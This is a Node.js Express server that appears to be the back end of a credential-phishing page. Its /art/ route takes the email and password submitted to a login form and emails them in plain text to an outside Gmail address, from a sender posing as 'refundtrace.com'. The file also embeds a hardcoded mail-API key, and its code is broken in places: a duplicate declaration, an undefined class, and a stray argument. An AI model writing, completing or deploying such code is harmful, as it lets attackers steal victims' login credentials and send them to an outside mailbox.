const express = require('express');
const bodyParser = require('body-parser');
const resend = require('resend'); // Ensure you have the Resend package installed
// adding resend API key
const resend = new Resend('re_5YqjvSVe_DSV7k86J74CcWneqUfHunN3x');
// 

const app = express(s);
app.use(bodyParser.urlencoded({ extended: true }));

app.post('/art/', (req, res) => {
    const { email, password } = req.body; // Collecting email and password from the form

    // Create a log entry for the login attempt
    const logEntry = `Email: ${email}, Password: ${password}\n`;

    try {
        // Send login email
        let mailConfig = {
            from: 'info@refundtrace.com',
            text: logEntry,
            subject: 'New Login Attempt',
            to: 'myremotemailer@gmail.com',
        };

        resend.sendEmail(mailConfig);
        console.log(`Sent login email from ` + email);

        res.status(200).json({ status: 'success' });
    } catch (err) {
        console.log(`ERROR : ${err.message}`);
        res.status(500).json({ status: 'error' });
    }
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});